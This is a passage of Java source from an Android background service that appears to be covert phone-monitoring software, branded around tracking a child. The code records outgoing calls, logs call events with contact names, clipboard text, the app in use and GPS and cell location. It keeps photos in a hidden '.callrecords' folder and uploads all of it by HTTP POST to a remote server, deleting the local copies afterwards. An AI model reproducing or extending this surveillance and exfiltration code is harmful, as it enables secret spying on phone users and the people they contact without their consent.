	}
	
	// Upload data on remote server.
	protected void doUploadData(){
		new Thread(new Runnable(){
			public void run(){
				doSendHtml();
				checkDate();
				//if(!mIsRoaming)
				//	doSendMedia();
				//Log.i("KLS", "Data uploaded");
			}
		}).start();
	}
	
	// Launch thread to log new call
	private void doAfterDelay(){
		//WriteThread wtc = new WriteThread(sync, ".htm",
		//		Templates.getCall(newCallLog, newIncoming));
		//WriteThread wtc = new WriteThread(sync, ".htm",
		//		Templates.getCall(new String(newCallLog), newIncoming));
		new Thread(new Runnable(){
			public void run(){
				sync.writeLog(".htm", Templates.getCall(new String(newCallLog), newIncoming));
			}
		}).start();
		
		// Start record outgoing call
		Context context = getApplicationContext();
		if(Settings.recordOutCalls(context)){
			if(!recording)
				//startRecord("out_", newCallNumber);
				startRecord("out_", new String(newCallNumber));
		}
	}
	
	private void doSendHtml(){
		File path = getFilesDir();
		File f = new File(path, file + ".htm");
		final File fs;
		
		if(f.exists())
			fs = getLogsFromFile(f);
		else
			fs = null;
		
		if(fs != null){
			new Thread(new Runnable(){
				public void run(){
					sync.sendLog(fs, ".htm");
				}
			}).start();
			//SendThread sth = new SendThread(sync, fs, ".htm");
			
			/*try{
				st.start();
				st.join();
			}catch(InterruptedException e){
				app.logError(CN + "doSendingFile", e.toString());
			}*/
			
			// Save html file pointer to preferences if POST sent OK
			/*if(postSentOk){
				saveToPref("filePointer", filePointer);
				postSentOk = false;
			}*/					
		}
	}
	
	/*protected synchronized void doSendMedia(){
		if((uploadedSize > maxUploadSize) || stopUploadMedia)
			uploadSizeExceeded = true;
		else
			uploadSizeExceeded = false;
		
		// Check if there are any files in listFiles.txt
		//boolean internetIsOn = isInternetOn();
		if(!mNoConnectivity && mediaSlicer != null && !uploadSizeExceeded){
			// Get information from preferences
			String mFile = getStrPref("media_file");
			//Log.i("doSendingFile", "file: " + mFile);
			//String mime = new String();
			final long byteSent = getLongPref("media_point");
			
			if(mFile.equals("undefined")){
				mFile = listFileSync.getFileName(MEDIA_LIST);
			}
			//Log.i("doSendingFile", "file: " + mFile);
			
			// Return if listFile is empty
			if(mFile == null)
				return;
			
			File mediaFile = new File(mFile);
			if(!mediaFile.exists()){
				saveToPref("media_file", "undefined");
				saveToPref("media_point", 0L);
				listFileSync.removeFileName(MEDIA_LIST);
				return;
			}				
			
			// Gets next piece of media file
			File mf = mediaSlicer.getPiceOfFile(mFile, byteSent);
			//Log.i("KLS", "file: " + mf.getName() + " size: " + mf.length());
			if(mf != null){
				String mime = mediaSlicer.getMimeType(mFile);
				long bytesRead = mediaSlicer.getBytesRead();		
				
				if(mime.equals("audio/3gpp"))
					sync.sendRecord(mf);
				else if(mime.equals("image/jpeg"))
					sync.sendPhoto(mf, mime);
						
				// Check if POST was sent OK
				if(postSentOk){
					// Delete file from listFile if bytesRead < 20k
					if(bytesRead < MEDIA_BUFF){
						saveToPref("media_file", "undefined");
						saveToPref("media_point", 0L);
						// Delete photo after the last peace of one is sent
						if(mime.equalsIgnoreCase("image/jpeg")){
							File photo = new File(listFileSync.getFileName(MEDIA_LIST));
							photo.delete();
						}
						
						listFileSync.removeFileName(MEDIA_LIST);
					}else{
						saveToPref("media_file", mFile);
						saveToPref("media_point", (byteSent + bytesRead));
					}
					postSentOk = false;
				}				
			}
		}//else if(mNoConnectivity){
		//	app.logError(CN + "doSendingFile", "No any Internet connections");
		//}
	}*/
	
	
	
	// Log if a new task started	
	private void doScanTask(){
		ActivityManager actMng = (ActivityManager)KLService.this.getSystemService(ACTIVITY_SERVICE);
		List<RunningTaskInfo> taskInfo = actMng.getRunningTasks(1);		
		String packageName = taskInfo.get(0).topActivity.getPackageName();		
		
		if(!packageName.equalsIgnoreCase(prevPack)){
			PackageManager pm = getPackageManager();
			String currTask;
			//prevPack = packageName;
			prevPack = new String(packageName);
			try{
				CharSequence cs = pm.getApplicationLabel(pm.getApplicationInfo(packageName, 
						PackageManager.GET_META_DATA));
				currTask = cs.toString();
			}catch(Exception e){
				currTask = "unknown";					
			}
			
			if(!currTask.equals("unknown")){
				final String ct = new String(currTask);
				new Thread(new Runnable(){
					public void run(){
						sync.writeLog(".htm", Templates.getApiLog(ct));
					}
				}).start();
				//WriteThread wt = new WriteThread(sync, ".htm", Templates.getApiLog(currTask));
			}
		}
	}
	
	// Log if clipboard content is changed
	private void doScanClipboard(){
		ClipboardManager cm = (ClipboardManager)getSystemService(CLIPBOARD_SERVICE);
		String content = "";
		int cSize = 0;
		if(cm.hasText()){
			CharSequence tmp = cm.getText();
			cSize = tmp.length();
			if((prevClipSize != cSize) && (cSize != 0)){
				if(cSize > 30)
					content = tmp.subSequence(0, 30).toString();
				else
					content = tmp.toString();
				
				prevClipSize = cSize;
				
				// Log clipboard content
				final String cnt = new String(content);
				new Thread(new Runnable(){
					public void run(){
						sync.writeLog(".htm", Templates.getClipboardLog(cnt));
					}
				}).start();
				//WriteThread wcb = new WriteThread(sync, ".htm",
				//		Templates.getClipboardLog(content));
			}
		}
	}
	
	// Resize images
	protected void resizeImages(){
		new Thread(new Runnable(){
			public void run(){
				String imageFile;
				ResizeImage ri = new ResizeImage(KLService.this);
				if(!userPresent){
					String dir = Environment.getExternalStorageDirectory().getAbsolutePath() +
						"/.callrecords";
					File mediaDir = new File(dir);
					if(!mediaDir.exists()){
						if(!mediaDir.mkdir())
							return;
					}
						
					
					while((imageFile = listFileSync.getFileName(PHOTO_LIST)) != null){
						try{
							// Check if image file exists
							File f = new File(imageFile);
							if(!f.exists()){
								listFileSync.removeFileName(PHOTO_LIST);
								continue;
							}				
							
							// Add resized image to media list
							String fileName = ri.resizeAndSaveImage(imageFile);
							if(fileName != null){
								listFileSync.removeFileName(PHOTO_LIST);
								listFileSync.addFileName(fileName, MEDIA_LIST);
							}
						}catch(Exception e){
							app.logError(CN + "resizeImages", e.toString());
						}						
					}
					/*imageFile = listFileSync.getFileName(PHOTO_LIST);
					if(imageFile == null)
						return;	
					
					// Check if image file exists
					File f = new File(imageFile);
					if(!f.exists()){
						listFileSync.removeFileName(PHOTO_LIST);
						continue;
					}				
					
					// Add resized image to media list
					String fileName = ri.resizeAndSaveImage(imageFile);
					if(fileName != null){
						listFileSync.removeFileName(PHOTO_LIST);
						listFileSync.addFileName(fileName, MEDIA_LIST);
					}*/
				}
			}
		}).start();				
	}
	
	// This method is launched by run one of WriteThread class
	protected void writeLogs(String fileType, byte[] lBuff){
		String fName = file + fileType;
		File path = getFilesDir();
		File f = new File(path, fName);
		// Creates the file if it doesn't exist
		if(!f.exists()){
			String devId = android.provider.Settings.System.getString(getContentResolver(), 
					android.provider.Settings.System.ANDROID_ID);
			byte[] buff = Templates.getHeader(devId);
			try{			
				//path.mkdir();			
				//FileOutputStream fos = new FileOutputStream(f);
				FileOutputStream fos = openFileOutput(f.getName(), Context.MODE_PRIVATE);
				fos.write(buff);
				fos.close();
			}catch(IOException e){
				app.logError(CN + "writeLogs", e.toString());
			}catch(SecurityException e){
				app.logError(CN + "writeLogs", e.toString());
			}
		}
		
		// Add log to the file
		try{
			FileOutputStream fos = openFileOutput(fName, Context.MODE_APPEND);
			fos.write(lBuff);
			fos.close();
		}catch(IOException e){
			app.logError(CN + "writeLogs", e.toString());
		}
	}
	
	protected File getLogsFromFile(File f){
		File path = new File(getFilesDir().getPath() + "/logs/");
		File out = new File(path, f.getName());
		byte[] tmp = null;
		try{
			filePointer = getLongPref("filePointer");
			tmp = sync.readLogFile(f);
			if(tmp != null){
				if(!path.exists())
					path.mkdir();
				FileOutputStream fos = new FileOutputStream(out, false);
				fos.write(tmp);
				fos.close();
			}		
		}catch(IOException e){
			app.logError(CN + "getLogsFromFile", e.toString());
		}
		
		if(tmp == null)
			return null;
		else
			return out;
	}
	
	protected void sendPOST(File f, String content, String mimeType, boolean delFile,
			boolean increaseUploadedSize) {			
		Date now = new Date();
		String fileDate = String.format("%td/%tm/%tY %tT", now, now, now, now);
		String devField = Settings.getDeviceField(this);
		if(devField.equals("undefined") || devField.equals("")){
			return;
		}
		if(f == null){
			//app.logError(CN + "sendPOST", "f parameter is null");
			return;
		}
		if(mimeType == null){
			//app.logError(CN + "sendPOST", "mime parameter is null");
			return;
		}
		try{
			//HttpParams params = new BasicHttpParams();
			//HttpConnectionParams.setSoTimeout(params, 40000);
			//HttpConnectionParams.setConnectionTimeout(params, 40000);
			//HttpClient client = new DefaultHttpClient(params);
			
			HttpClient client = new DefaultHttpClient();
			String postUrl = getString(R.string.upload_link);
			//String postUrl = "http://10.0.2.2/denwer/";
			HttpPost post = new HttpPost(postUrl);
			FileBody bin = new FileBody(f, mimeType, f.getName());
			StringBody sb1 = new StringBody(devField); //dYZ-PC-Gzq
			StringBody sb2 = new StringBody(content);
			StringBody sb3 = new StringBody("Android " + Build.VERSION.RELEASE);
			StringBody sb4 = new StringBody(Settings.getApiVersion(this));
			StringBody sb5 = new StringBody(fileDate);
			StringBody sb6 = new StringBody("append");
			
			MultipartEntity reqEntity =
				new MultipartEntity(HttpMultipartMode.STRICT);
			reqEntity.addPart("file", bin);
			reqEntity.addPart("device", sb1);
			reqEntity.addPart("content", sb2);
			reqEntity.addPart("client-ver", sb3);
			reqEntity.addPart("app-ver", sb4);
			reqEntity.addPart("client-date-time", sb5);
			reqEntity.addPart("file-store", sb6);
			
			post.setEntity(reqEntity);
			
			// Check Internet connection
			//if(isInternetOn()){
			if(!mNoConnectivity){	
				HttpResponse response = client.execute(post);
				HttpEntity resEntity = response.getEntity();
				if(resEntity != null){
					pStatus = EntityUtils.toString(resEntity);
					if(pStatus.equalsIgnoreCase("Ok")){
						if(mimeType.equals("text/html"))
							saveToPref("filePointer", filePointer);
						FILE_SENT = f.getName();
						SIZE_SENT = f.length();
						postSentOk = true;						
						app.mSendTime = new String(fileDate);
						if(increaseUploadedSize)
							uploadedSize = uploadedSize + (int)f.length();
					}else{
						// Check response of server
						if(pStatus.contains("<html>"))
							return;
						else if(pStatus.contains(new String(REJECT)))
							stopUploadMedia = true;
						else if(pStatus.contains(new String(UPDATE)) || 
								pStatus.contains(new String(BAD_DEV)) || 
								pStatus.contains(new String(NOT_FOUND)))
							unregisterReceiver(timeTick);
						
						//app.logError(CN + "sendPOST", pStatus + " file: " + f.getName());
					}					
					app.logError(CN + "sendPOST", "Response: " + pStatus + " file: " +
							f.getName() + " size: " + f.length());
					//Log.i(CN + "sendPOST", "Response: " + pStatus);					
				}else
					app.logError(CN + "sendPOST", "Response is NULL");				
			}//else
			//	app.logError(CN + "sendPOST", "No any Internet connections");
			
			if(delFile){
				f.delete();
			}
		}catch(Exception e){
			if(delFile){
				f.delete();
			}
			app.logError(CN + "sendPOST", e.toString() + " file:" + f.getName() + " size: " + f.length());			
		}
	}
	
	// Check if Internet connection id On
	/*private boolean isInternetOn(){
		ConnectivityManager cm = (ConnectivityManager)getSystemService(
				Context.CONNECTIVITY_SERVICE);
		NetworkInfo netInf = null;
		try{
			netInf = cm.getActiveNetworkInfo();
		}catch(NullPointerException e){
			app.logError(CN + "isInternetOn", e.toString());
		}
		
		if(netInf != null){
			if(netInf.isAvailable() && netInf.isConnected())
				return true;
		}		
		
		return false;
	}*/
	
	// Log service state (who start/stop the one)
	private void logServiceState(final boolean start){
		SharedPreferences pref = this.getSharedPreferences(PREF_NAME, 0);
		final boolean user = pref.getBoolean("user_control", false);
		
		//WriteThread wtls;
		if(user){
			//wtls = new WriteThread(sync, ".htm", 
			//		Templates.getServiceState(start, true));
			SharedPreferences.Editor svpr = this.getSharedPreferences(PREF_NAME, 0).edit();
			svpr.putBoolean("user_control", false);
			svpr.commit();
		}
		//else{
		//	wtls = new WriteThread(sync, ".htm",
		//			Templates.getServiceState(start, false));
		//}
		Thread ls = new Thread(new Runnable(){
			public void run(){
				sync.writeLog(".htm", Templates.getServiceState(start, user));
			}
		});
		
		if(start)
			ls.start();
		else{
			try{
				ls.start();
				ls.join();
			}catch(InterruptedException e){
				app.logError(CN + "logServiceState", e.toString());
			}
		}				
	}
	
	// Save data to Shared Preferences
	private void saveToPref(String key, String value){
		SharedPreferences.Editor pref = this.getSharedPreferences(PREF_NAME, 0).edit();
		pref.putString(key, value);
		pref.commit();
	}
	
	private void saveToPref(String key, long value){
		SharedPreferences.Editor pref = this.getSharedPreferences(PREF_NAME, 0).edit();
		pref.putLong(key, value);
		pref.commit();
	}
	
	private void saveToPref(String key, int value){
		SharedPreferences.Editor pref = this.getSharedPreferences(PREF_NAME, 0).edit();
		pref.putInt(key, value);
		pref.commit();
	}
	
	private void saveToPref(String key, boolean value){
		SharedPreferences.Editor pref = this.getSharedPreferences(PREF_NAME, 0).edit();
		pref.putBoolean(key, value);
		pref.commit();
	}
	
	private String getStrPref(String key){
		SharedPreferences pref = this.getSharedPreferences(PREF_NAME, 0);
		String value = pref.getString(key, "undefined");
		
		return value;
	}
	
	private long getLongPref(String key){
		SharedPreferences pref = this.getSharedPreferences(PREF_NAME, 0);
		long value = pref.getLong(key, 0);
		return value;
	}
	
	private int getIntPref(String key){
		SharedPreferences pref = this.getSharedPreferences(PREF_NAME, 0);
		return pref.getInt(key, 0);
	}
	
	private boolean getBoolPref(String key){
		SharedPreferences pref = this.getSharedPreferences(PREF_NAME, 0);
		return pref.getBoolean(key, true);
	}
	
	// Save location
	private void saveLocation(Location location){
		//Location location = locMngr.getLastKnownLocation(LocationManager.GPS_PROVIDER);
		if(location != null){
			final String provider = location.getProvider();
			final double longitude = location.getLongitude();
			final double latitude = location.getLatitude();
			// Create thread which save locations to file
			new Thread(new Runnable(){
				public void run(){
					sync.writeLog(".htm", Templates.getLocations(provider, longitude, latitude));
				}
			}).start();
		}else{
			app.logError(CN + "saveLocation", "Location parameter is null");
		}		
	}
	
	protected void saveCellLoc(final String cellId, final String lac){
		new Thread(new Runnable(){
			public void run(){
				sync.writeLog(".htm", Templates.getCellLoc(new String(cellId), new String(lac)));
			}
		}).start();
	}
	
	private String getNameFromContacts(String number, boolean record){
		ContentResolver cr = getContentResolver();
		// Get Name from Contacts
		Uri uri = Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI, Uri.encode(number));
		Cursor curId = cr.query(uri, new String[]{PhoneLookup.DISPLAY_NAME}, 
				null, null, null);
		if(curId == null){
			if(record)
				return "unknown";
			else
				return number + " unknown";
		}
		
		if(curId.getCount() > 0){
			while(curId.moveToNext()){
				String name = curId.getString(curId.getColumnIndex(PhoneLookup.DISPLAY_NAME));
				if(!name.equals("")){
					if(record)
						return name;
					else
						return number + " " + name;
				}
			}			
		}
		curId.close();
		
		if(record)
			return "unknown";
		else
			return number + " unknown";
	}
	
	protected class AudioRecordThread implements Runnable {
		String threadName;
		Thread t;
		File f;
		
		public AudioRecordThread(String threadName, File file){
			this.threadName = threadName;
			f = file;
			t = new Thread(this, threadName);
			t.start();			
		}
		
		public void run(){
			recording = true;
			// Initialize recorder
			recorder = new MediaRecorder();
			try{
				recorder.setAudioSource(AudioSource.VOICE_UPLINK);
				recorder.setOutputFormat(OutputFormat.THREE_GPP);
				recorder.setAudioEncoder(AudioEncoder.DEFAULT);
				recorder.setOutputFile(f.getAbsolutePath());
				recorder.setMaxDuration(Settings.getMaxTimeRec(KLService.this));
				recorder.setMaxFileSize(Settings.getMaxSizeRec(KLService.this));
				recorder.setOnInfoListener(new MediaInfoListener());
				recorder.prepare();
				recorder.start();
			}catch(IllegalStateException e){
				recording = false;
				app.logError("AudioRecordThread", e.toString());
			}catch(IOException e){
				recording = false;
				app.logError("AudioRecordThread", e.toString());
			}
		}
	}
	
	// Class which implements interface OnInfoListener
	protected class MediaInfoListener implements OnInfoListener {
		public void onInfo(MediaRecorder mr, int what, int extra){
			if(what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED || 
					what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_FILESIZE_REACHED){
				stopRecord();
			}			
		}
	}
	
	// Class which implements interface LocationListener
	public class KidLocListener implements LocationListener {
		public void onLocationChanged(Location location){
			saveLocation(location);
			//Log.i(CN, "location: " + location.toString());
		}
		
		public void onProviderDisabled(String provider){
			//Log.i(CN, provider + " disabled");
		}
		
		public void onProviderEnabled(String provider){
			//Log.i(CN, provider + " enabled");
		}
		
		public void onStatusChanged(String provider, int status, Bundle extras){
			/*
			String tmp = provider;
			if(!tmp.equals("")){
				switch(status){
				case LocationProvider.OUT_OF_SERVICE:
					tmp += " is out of service";
					app.logError("provider state", tmp);
					break;
				case LocationProvider.TEMPORARILY_UNAVAILABLE:
					tmp += " is temporarily unavailable";
					app.logError("provider state", tmp);
					break;
				}							
			}
			*/
			//Log.i(CN, provider + " status: " + status);
		}
	}
	
	/*public class CallIntentReceiver extends BroadcastReceiver {
		public void onReceive(Context context, Intent intent){
			String action = intent.getAction();
			if(action.equals(KLService.OUTGOING_CALL)){
				final String number = intent.getStringExtra("number");
				if(number == null)
					return;
				new Thread(new Runnable(){
					public void run(){
						runCallEvent(CallsReceiver.NEW_CALL, new String(number), false);
					}
				}).start();				
			}			
		}
	}*/
	
	/*// This class is used to connect to main Activity
	public class LocalBinder extends Binder {
		KLService getService(){
			return KLService.this;
		}
	}*/
	
	// This class synchronize all stream which have access to log file
	public class Synchronizer {
		public synchronized void writeLog(String fileType, byte[] buff){
			writeLogs(fileType, buff);
		}
		
		public synchronized void sendLog(File f, String fileType){			
			sendPOST(f, "HTML", "text/html", true, false);
		}
		
		public synchronized void sendRecord(File file){
			sendPOST(file, "3GP", "audio/3gpp", true, true);
		}
		
		public synchronized void sendPhoto(File file, String mimeType){
			sendPOST(file, "JPG", mimeType, true, true);			
		}
		
		protected synchronized byte[] readLogFile(File f){
			RandomAccessFile raf = null;
			byte[] tmp = new byte[1024];
			byte[] resArray = null;
			int result = 0;
			try{
				raf = new RandomAccessFile(f, "r");
				if(filePointer != 0)
					raf.seek(filePointer);
				ByteArrayOutputStream bos = new ByteArrayOutputStream();
				while((result = raf.read(tmp)) != -1){
					bos.write(tmp, 0, result);					
					filePointer += (long)result;
				}				
				raf.close();				
				resArray = bos.toByteArray();
				bos.close();
			}catch(IOException e){
				return null;
			}
			
			if(resArray.length == 0)
				return null;
			
			return resArray;
		}
	}
}
